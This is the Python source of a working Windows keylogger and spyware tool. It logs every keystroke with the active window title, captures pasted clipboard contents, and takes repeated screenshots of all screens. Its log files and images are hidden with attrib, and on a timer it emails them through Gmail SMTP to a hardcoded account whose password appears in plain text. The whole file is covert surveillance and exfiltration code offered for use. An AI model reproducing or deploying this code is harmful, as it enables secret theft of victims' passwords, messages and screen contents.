from lib2to3.pytree import type_repr
import win32api
import win32console
import win32gui
from PIL import ImageGrab
import re
from win32con import VK_CAPITAL
from pynput.keyboard import Key, Listener
import win32clipboard
import os
import smtplib
from email.message import EmailMessage
from threading import Thread
from time import time, sleep
import imghdr
from subprocess import call
  
win = win32console.GetConsoleWindow()
keys = []
windowNameList = []
i = 0
iterationTime = 10
currentTime = time()
stopTime = time() + iterationTime
imgList = []
conn = ''

def on_press(key):
    global keys, count
    keys.append(key)
    w = win32gui
    #screenshot()
    windowName = str(w.GetWindowText(w.GetForegroundWindow()))
    if windowName not in windowNameList:
        windowNameList.append(windowName)
    write_file(keys, windowName)
    keys = []
    #if it reaches at this point we should send the text files
            

def sendEmail():
    global conn
    msg = EmailMessage()
    msg['Subject'] = 'Key logged'
    msg['From'] = 'hackingman4321@gmail.com'
    msg['To'] = 'hackingman4321@gmail.com'
    password = 'hackingman1!'
    call( "attrib -h output.txt", creationflags= 0x08000000 )
    with open('output.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name
    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
    call( "attrib +h output.txt", creationflags= 0x08000000 )
    call( "attrib -h windowLog.txt" , creationflags= 0x08000000)  
    with open('windowLog.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name
    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)
    call( "attrib +h windowLog.txt", creationflags= 0x08000000 )
    for screenshot in imgList:
        with open(screenshot, 'rb') as f:
            call('attrib -h {}'.format(screenshot, creationflags= 0x08000000))
            file_data = f.read()
            file_type =imghdr.what(f.name)
            file_name = f.name
            call('attrib +h {}'.format(screenshot), creationflags= 0x08000000)
        msg.add_attachment(file_data, maintype='image', subtype=file_type, filename=file_name)
    t3 = Thread(target=chuck_email, args=(msg, password,))
    t3.start()

def chuck_email(msg,password):
    conn.login('hackingman4321@gmail.com', password)
    conn.send_message(msg)

def write_file(keys, windowName):
    #unhide file
    call( "attrib -h windowLog.txt", creationflags= 0x08000000 )
    open('windowLog.txt', 'w').close()
    #append list to log file
    with open('windowLog.txt', 'a') as windowF:
        for window in windowNameList:
            windowF.write(window + ',')
    #hide file again once done
    call( "attrib +h windowLog.txt", creationflags= 0x08000000 )
    #hide file
    call( "attrib -h output.txt", creationflags= 0x08000000 )
    with open("output.txt", 'a') as f:
        for key in keys:
            k = str(key).replace('\'', '')
            if k.find("space") > 0:
                f.write('\'(space)\' '+ windowName + '\n')
                f.close()
            else:
                key = str(key).replace('\'','')
                regex = re.search('x\d{2}', key)
                if key.find('Key') > -1:
                    key = key.split('.')[1]
                    f.write('\'(' + key + ')\' ' + windowName + '\n')
                elif regex:#check if its some command action
                    if key.find('03') > -1:
                        key = 'copy'
                        f.write('\'(' + key + ')\' ' + windowName + '\n')
                    elif key.find('18') > -1:
                        key = 'cut ' + pasted_data
                        f.write('\'(' + key + ')\' ' + windowName + '\n')
                    elif key.find('16') > -1:
                        #case of paste, it's always pasting the last data in the clipboard
                        win32clipboard.OpenClipboard()
                        pasted_data = win32clipboard.GetClipboardData()
                        win32clipboard.CloseClipboard()
                        key = 'pasted-' + pasted_data
                        f.write('\'(' + key + ')\' ' + windowName + '\n')
                else:
                    #have to check state of capslock
                    capsLockOn = win32api.GetKeyState(VK_CAPITAL)
                    if(capsLockOn == 1):
                        #since this should only take in letters or numbers or basic symbols
                        #check if it is a letter we need to change its states
                        if key.isalpha():
                            if key.islower():
                                key = key.upper()
                            else:
                                key = key.lower()
                        f.write('\'' + key + '\' ' + windowName + '\n')
                        f.close()

                    else:
                        f.write('\'' + key + '\' ' + windowName + '\n')
                        f.close()
    #unhide file
    call( "attrib +h output.txt", creationflags= 0x08000000)

def checkTime():
    global currentTime, stopTime, i, imgList, windowNameList
    im = ImageGrab.grab(all_screens=True)
    screenshotName = 'screenshot{}.png'.format(i)
    im.save(screenshotName)
    i += 1
    imgList.append(screenshotName)
    call('attrib +h {}'.format(screenshotName), creationflags= 0x08000000)

    #recursion
    if currentTime < stopTime:
        currentTime = time()
        sleep(5)
        checkTime()
    else:
        sendEmail()
        #once the email sends clean up the file for prepping next email
        call( "attrib -h windowLog.txt", creationflags= 0x08000000 )
        call( "attrib -h output.txt", creationflags= 0x08000000 )
        open('windowLog.txt', 'w').close()
        open('output.txt', 'w').close()
        call( "attrib +h windowLog.txt", creationflags= 0x08000000 )
        call( "attrib +h output.txt", creationflags= 0x08000000 )
        windowNameList = []
        for screenshot in imgList:
            call('attrib -h {}'.format(screenshot))
            try:
                os.remove(screenshot)
            except:
                pass
        imgList = []
        #reset timer
        currentTime = time()
        stopTime = currentTime + iterationTime
        sleep(5)
        checkTime()

def create_conn():
    global conn
    conn = smtplib.SMTP_SSL("smtp.gmail.com", 465) 

def keyLogger():
    #run a quick screenshot remover as it pops up an error
    #just removing first 100 cause typically the screen email should send for the first 30 screenshots
    create_conn()
    call( "attrib -h windowLog.txt", creationflags= 0x08000000)
    call( "attrib -h output.txt")
    open('windowLog.txt', 'w').close()
    open('output.txt', 'w').close()
    call( "attrib +h windowLog.txt" , creationflags= 0x08000000)
    call( "attrib +h output.txt", creationflags= 0x08000000 )
    j = 0
    while(j < 100):
        try:
            os.remove('screenshot{}.png'.format(j))
        except:
            pass
        j += 1
    t1 = Thread(target=checkTime)
    t1.start()
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    keyLogger()
